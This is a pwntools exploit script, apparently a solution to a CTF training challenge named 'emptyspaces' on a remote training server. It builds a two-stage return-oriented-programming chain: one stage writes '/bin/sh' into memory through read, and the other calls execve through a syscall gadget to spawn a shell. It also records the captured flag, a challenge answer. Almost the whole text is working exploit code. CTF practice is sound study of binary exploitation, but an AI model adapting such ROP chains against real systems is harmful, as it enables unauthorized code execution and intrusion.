from pwn import *

#r = process("./emptyspaces")
#binary = ELF("./emptyspaces")

r = remote("bin.training.jinblack.it", 4006)

#gdb.attach(r, '''
#b * 0x00400bfd
#''') 


#flag{it_is_always_nice_to_pull_off_a_rop_chain!}

#goal: to call sys_execve
#I will do it with a multistage strategy: 
#   the first read is a read function in order to write /bin/sh in a padding area
#   the second read is the execve that needs /bin/sh as a parameter, taken from the padding area

#now I call the read, in order to write /bin/sh in the padding area since I need to retrieve it when I call execve

#using ROPgadget --binary emptyspaces, I retrieve the addresses of the gadgets that I need, in order to store them

r.recvuntil("Where we used to pwn?\n")

POP_RDX_RSI = 0x44bd59      # pop rdx ; pop rsi; ret
POP_RDI = 0x400696          # pop rdi ; ret
MAIN_ADDRESS = 0X00400b95   # in order to restart the main function
READ_ADDRESS = 0x04497b0    # in order to call the read

payload = b"A" * 64         #filling the buffer
payload += b"BBBBBBBB"      #RBP

payload += p64(POP_RDX_RSI)
payload += p64(8)           #count = 8, to write /bin/sh
payload += p64(0x6bc070)    #pointer to the padding area

payload += p64(POP_RDI)
payload += p64(0)           #fd of the stdin: 0

payload += p64(READ_ADDRESS)

#restarting the main() function
payload += p64(MAIN_ADDRESS)

input("press a key for the first payload...")

r.sendline(payload)

time.sleep(2)

#sending /bin/sh on stdin in order to write it on the padding area
r.send(b"/bin/sh\x00")

time.sleep(2)



#here I restarted the main function

r.recvuntil("Where we used to pwn?\n")

#now we have to call execve passing /bin/sh as a parameter.
#/bin/sh will be passed through command line as soon as I can write, while the other parameters will be loaded through gadgets

POP_RAX = 0x4155a4          #pop rax ; ret
SYSCALL = 0x40128c          #syscall

payload2 = b"A" * 64        #filling the buffer
payload2 += b"BBBBBBBB"     #RBP

payload2 += p64(POP_RDI)
payload2 += p64(0x6bc070)   #padding area, where to retrieve /bin/sh

payload2 += p64(POP_RAX)
payload2 += p64(0x3b)

payload2 += p64(POP_RDX_RSI)
payload2 += p64(0)
payload2 += p64(0)

payload2 += p64(SYSCALL)

input("press a key for the second payload...")

r.sendline(payload2)

r.interactive()